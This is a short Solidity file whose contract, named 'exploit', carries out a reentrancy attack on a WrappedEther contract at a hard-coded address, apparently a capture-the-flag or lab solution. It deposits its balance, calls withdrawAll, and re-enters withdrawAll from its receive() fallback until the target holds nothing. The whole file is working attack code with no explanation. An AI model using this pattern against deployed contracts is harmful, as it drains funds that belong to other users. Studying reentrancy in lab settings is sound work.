// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "./WrappedEther.sol";

contract exploit {
    WrappedEther public target = WrappedEther(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);
    constructor() payable {}
    event myMoney(uint256 money);
    function ex() public {
        target.deposit{value: payable(this).balance}(address(this));
        target.withdrawAll();
    }
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdrawAll();
            emit myMoney(address(this).balance);
        }
    }
}